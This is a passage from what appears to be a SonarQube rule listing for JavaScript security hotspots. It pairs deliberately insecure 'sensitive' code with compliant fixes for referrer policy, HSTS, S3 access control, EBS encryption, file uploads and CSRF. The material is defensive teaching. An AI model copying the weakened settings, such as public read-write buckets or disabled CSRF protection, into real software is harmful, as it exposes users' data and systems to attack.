<ul><li> Confidential information exists in URLs. </li><li> Semantic of HTTP methods is not respected (eg: use of a GET method instead of POST when the state of the application is changed). </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Confidential information should not be set inside URLs (GET requests) of the application and a safe (ie: different from <code>unsafe-url</code> or
<code>no-referrer-when-downgrade</code>) <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy" rel="nofollow">referrer-Policy</a>
header, to control how much information is included in the referer header, should be used.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> <code>referrerPolicy</code>
middleware is disabled or used with <code>no-referrer-when-downgrade</code> or <code>unsafe-url</code>:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

app.use(
  helmet.referrerPolicy({
    policy: &#39;no-referrer-when-downgrade&#39; // Sensitive: no-referrer-when-downgrade is used
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a secure solution is to user the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> referrer policy middleware set
to <code>no-referrer</code>:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.referrerPolicy({
    policy: &#39;no-referrer&#39; // Compliant
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy" rel="nofollow">developer.mozilla.org</a> - Referrer-Policy </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns" rel="nofollow">developer.mozilla.org</a> -
  Referer header: privacy and security concerns </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5739">
              javascript:S5739
            </a>
          </td>
          <td>
            <details>
              <p>When implementing the HTTPS protocol, the website mostly continue to support the HTTP protocol to redirect users to HTTPS when they request a HTTP
version of the website. These redirects are not encrypted and are therefore vulnerable to man in the middle attacks. The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security" rel="nofollow">Strict-Transport-Security policy header</a> (HSTS) set by
an application instructs the web browser to convert any HTTP request to HTTPS.</p>
<p>Web browsers that see the Strict-Transport-Security policy header for the first time record information specified in the header:</p>
<ul><li> the <code>max-age</code> directive which specify how long the policy should be kept on the web browser. </li><li> the <code>includeSubDomains</code> optional directive which specify if the policy should apply on all sub-domains or not. </li><li> the <code>preload</code> optional directive which is not part of the HSTS specification but supported on all modern web browsers. </li></ul>
<p>With the <code>preload</code> directive the web browser never connects in HTTP to the website and to use this directive, it is required <a href="https://hstspreload.org/" rel="nofollow">to submit</a> the concerned application to a preload service maintained by Google.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The website is accessible with the unencrypted HTTP protocol. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement Strict-Transport-Security policy header, it is recommended to apply this policy to all subdomains (<code>includeSubDomains</code>) and
for at least 6 months (<code>max-age&#61;15552000</code>) or even better for 1 year (<code>max-age&#61;31536000</code>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> or <a href="https://www.npmjs.com/package/hsts" rel="nofollow">hsts</a> middleware are disabled or used without recommended values:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.hsts({
  maxAge: 3153600, // Sensitive, recommended &gt;&#61; 15552000
  includeSubDomains: false // Sensitive, recommended &#39;true&#39;
}));
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement HSTS is with the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> or <a href="https://www.npmjs.com/package/hsts" rel="nofollow">hsts</a> middleware:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true
})); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security" rel="nofollow">developer.mozilla.org</a> - Strict Transport
  Security </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6265">
              javascript:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul><li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively &#34;read&#34; and &#34;read and write&#34; privileges to anyone, either
  authenticated or anonymous (<code>AllUsers</code> group). </li><li> <code>AUTHENTICATED_READ</code> grants &#34;read&#34; privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, i.e., to only grant users the necessary permissions for their required tasks. In the
context of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users, either authenticated or anonymous, have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access control:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;bucket&#39;, {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});

new s3deploy.BucketDeployment(this, &#39;DeployWebsite&#39;, {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the bucket and its ACL.</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;bucket&#39;, {
    accessControl: s3.BucketAccessControl.PRIVATE
});

new s3deploy.BucketDeployment(this, &#39;DeployWebsite&#39;, {
    accessControl: s3.BucketAccessControl.PRIVATE
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html" rel="nofollow">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html" rel="nofollow">AWS CDK version 2</a> - Class Bucket (construct) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5743">
              javascript:S5743
            </a>
          </td>
          <td>
            <details>
              <p>By default, web browsers perform <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch/" rel="nofollow">DNS prefetching</a> to reduce
latency due to DNS resolutions required when an user clicks links from a website page.</p>
<p>For instance on example.com the hyperlink below contains a cross-origin domain name that must be resolved to an IP address by the web browser:</p>
<pre>
&lt;a href&#61;&#34;https://otherexample.com&#34;&gt;go on our partner website&lt;/a&gt;
</pre>
<p>It can add significant latency during requests, especially if the page contains many links to cross-origin domains. DNS prefetch allows web
browsers to perform DNS resolving in the background before the user clicks a link. This feature can cause privacy issues because DNS resolving from
the user’s computer is performed without his consent if he doesn’t intent to go to the linked website.</p>
<p>On a complex private webpage, a combination &#34;of unique links/DNS resolutions&#34; can indicate, to a eavesdropper for instance, that the user is
visiting the private page.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Links to cross-origin domains could result in leakage of confidential information about the user’s navigation/behavior of the website. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control" rel="nofollow">X-DNS-Prefetch-Control</a> header with an
<em>off</em> value but this could significantly degrade website performances.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/dns-prefetch-control" rel="nofollow">dns-prefetch-control</a>
middleware is disabled or used without the recommended value:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.dnsPrefetchControl({
    allow: true // Sensitive: allowing DNS prefetching is security-sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/dns-prefetch-control" rel="nofollow">dns-prefetch-control</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware is the standard way to implement <code>X-DNS-Prefetch-Control</code> header:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.dnsPrefetchControl({
    allow: false // Compliant
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html" rel="nofollow">OWASP Top 10 2017 Category
  A3</a> - Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control" rel="nofollow">developer.mozilla.org</a> - X-DNS-Prefetch-Control
  </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch" rel="nofollow">developer.mozilla.org</a> - Using dns-prefetch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2598">
              javascript:S2598
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>If the file upload feature is implemented without proper folder restriction, it will result in an implicit trust violation within the server, as
trusted files will be implicitly stored alongside third-party files that should be considered untrusted.</p>
<p>This can allow an attacker to disrupt the security of an internal server process or the running application.</p>
<h3>What is the potential impact?</h3>
<p>After discovering this vulnerability, attackers may attempt to upload as many different file types as possible, such as javascript files, bash
scripts, malware, or malicious configuration files targeting potential processes.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in uploading a file recognized by in an internal tool, triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<h4>Server Resource Exhaustion</h4>
<p>By repeatedly uploading large files, an attacker can consume excessive server resources, resulting in a denial of service.</p>
<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service can only affect the attacker who caused it.</p>
<p>Even though a denial of service might have little direct impact, it can have secondary impact in architectures that use containers and container
orchestrators. For example, it can cause unexpected container failures or overuse of resources.</p>
<p>In some cases, it is also possible to force the product to &#34;fail open&#34; when resources are exhausted, which means that some security features are
disabled in an emergency.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Formidable</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const Formidable &#61; require(&#39;formidable&#39;);

const form          &#61; new Formidable(); // Noncompliant
form.uploadDir      &#61; &#34;/tmp/&#34;;
form.keepExtensions &#61; true;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const Formidable &#61; require(&#39;formidable&#39;);

const form          &#61; new Formidable();
form.uploadDir      &#61; &#34;/uploads/&#34;;
form.keepExtensions &#61; false;
</pre>
<h3>How does this work?</h3>
<h4>Use pre-approved folders</h4>
<p>Create a special folder where untrusted data should be stored. This folder should be classified as untrusted and have the following
characteristics:</p>
<ul><li> It should have specific read and write permissions that belong to the right people or organizations. </li><li> It should have a size limit or its size should be monitored. </li><li> It should contain backup copies if it contains data that belongs to users. </li></ul>
<p>This folder should not be located in <code>/tmp</code>, <code>/var/tmp</code> or in the Windows directory <code>%TEMP%</code>.<br /> These folders
are usually &#34;world-writable&#34;, can be manipulated, and can be accidentally deleted by the system.</p>
<p>Also, the original file names and extensions should be changed to controlled strings to prevent unwanted code from being executed based on the file
names.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://cwe.mitre.org/data/definitions/434" rel="nofollow">MITRE, CWE-434</a> - Unrestricted Upload of File with Dangerous Type </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" rel="nofollow">OWASP Unrestricted File Upload</a> - Unrestricted File
  Upload </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5742">
              javascript:S5742
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency" rel="nofollow">Certificate Transparency</a> (CT) is an open-framework to
protect against identity theft when certificates are issued. <a href="https://en.wikipedia.org/wiki/Certificate_authority" rel="nofollow">Certificate Authorities</a>
(CA) electronically sign certificate after verifying the identify of the certificate owner. Attackers use, among other things, social engineering
attacks to trick a CA to correctly verifying a spoofed identity/forged certificate.</p>
<p>CAs implement Certificate Transparency framework to publicly log the records of newly issued certificates, allowing the public and in particular
the identity owner to monitor these logs to verify that his identify was not usurped.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The website identity is valuable and well-known, therefore prone to theft. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT" rel="nofollow">Expect-CT</a> HTTP header which instructs the web browser
to check <a href="https://www.certificate-transparency.org/known-logs" rel="nofollow">public CT logs</a> in order to verify if the website appears inside and if it
is not, the browser will block the request and display a warning to the user.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/expect-ct" rel="nofollow">expect-ct</a> middleware is disabled:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
    helmet({
      expectCt: false // Sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/expect-ct" rel="nofollow">expect-ct</a> middleware is the standard way to implement
expect-ct. Usually, the deployment of this policy starts with the report only mode (<code>enforce: false</code>) and with a low <code>maxAge</code>
(the number of seconds the policy will apply) value and next if everything works well it is recommended to block future connections that violate
Expect-CT policy (<code>enforce: true</code>) and greater value for maxAge directive:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.expectCt({
  enforce: true,
  maxAge: 86400
})); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency" rel="nofollow">developer.mozilla.org</a> - Certificate Transparency
  </li><li> <a href="https://en.wikipedia.org/wiki/Certificate_authority" rel="nofollow">wikipedia.org</a> - Certificate Authority </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6275">
              javascript:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default" rel="nofollow">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The disk contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html" rel="nofollow">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from &#39;aws-cdk-lib&#39;;
import { Volume } from &#39;aws-cdk-lib/aws-ec2&#39;;

new Volume(this, &#39;unencrypted-explicit&#39;, {
      availabilityZone: &#39;us-west-2a&#39;,
      size: Size.gibibytes(1),
      encrypted: false // Sensitive
    });
</pre>
<pre>
import { Size } from &#39;aws-cdk-lib&#39;;
import { Volume } from &#39;aws-cdk-lib/aws-ec2&#39;;

new Volume(this, &#39;unencrypted-implicit&#39;, {
      availabilityZone: &#39;eu-west-1a&#39;,
      size: Size.gibibytes(1),
    }); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html" rel="nofollow">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from &#39;aws-cdk-lib&#39;;
import { Volume } from &#39;aws-cdk-lib/aws-ec2&#39;;

new Volume(this, &#39;encrypted-explicit&#39;, {
      availabilityZone: &#39;eu-west-1a&#39;,
      size: Size.gibibytes(1),
      encrypted: true
    });
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html" rel="nofollow">Amazon EBS encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6270">
              javascript:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The AWS resource stores or processes sensitive data. </li><li> The AWS resource is designed to be private. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;
import { aws_s3 as s3 } from &#39;aws-cdk-lib&#39;

const bucket &#61; new s3.Bucket(this, &#34;ExampleBucket&#34;)

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;s3:*&#34;],
    resources: [bucket.arnForObjects(&#34;*&#34;)],
    principals: [new iam.AnyPrincipal()] // Sensitive
}))
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;
import { aws_s3 as s3 } from &#39;aws-cdk-lib&#39;

const bucket &#61; new s3.Bucket(this, &#34;ExampleBucket&#34;)

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;s3:*&#34;],
    resources: [bucket.arnForObjects(&#34;*&#34;)],
    principals: [new iam.AccountRootPrincipal()]
}))
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6249">
              javascript:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enforce HTTPS only access by setting <code>enforceSSL</code> property to <code>true</code></p>
<h2>Sensitive Code Example</h2>
<p>S3 bucket objects access through TLS is not enforced by default:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

const bucket &#61; new s3.Bucket(this, &#39;example&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

const bucket &#61; new s3.Bucket(this, &#39;example&#39;, {
    bucketName: &#39;example&#39;,
    versioned: true,
    publicReadAccess: false,
    enforceSSL: true
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit" rel="nofollow">AWS documentation</a> - Enforce encryption
  of data in transit </li><li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5" rel="nofollow">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html" rel="nofollow">AWS CDK version 2</a> - Bucket </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4502">
              javascript:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses cookies to authenticate users. </li><li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li><li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Protection against CSRF attacks is strongly recommended:
    <ul><li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">unsafe HTTP
      methods</a>. </li><li> implemented, for example, with an unguessable CSRF token </li></ul>  </li><li> Of course all sensitive operations should not be performed with <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> protection is not found on an unsafe HTTP method like POST
method:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
let express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: true });

let app &#61; express();

// Sensitive: this operation doesn&#39;t look like protected by CSURF middleware (csrfProtection is not used)
app.post(&#39;/money_transfer&#39;, parseForm, function (req, res) {
  res.send(&#39;Money transferred&#39;);
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> is globally disabled on unsafe methods:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
let express &#61; require(&#39;express&#39;);

app.use(csrf({ cookie: true, ignoreMethods: [&#34;POST&#34;, &#34;GET&#34;] })); // Sensitive as POST is unsafe method
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> protection is used on unsafe methods:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
let express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie:  true });

let app &#61; express();

app.post(&#39;/money_transfer&#39;, parseForm, csrfProtection, function (req, res) { // Compliant
  res.send(&#39;Money transferred&#39;)
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> is enabled on unsafe methods:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
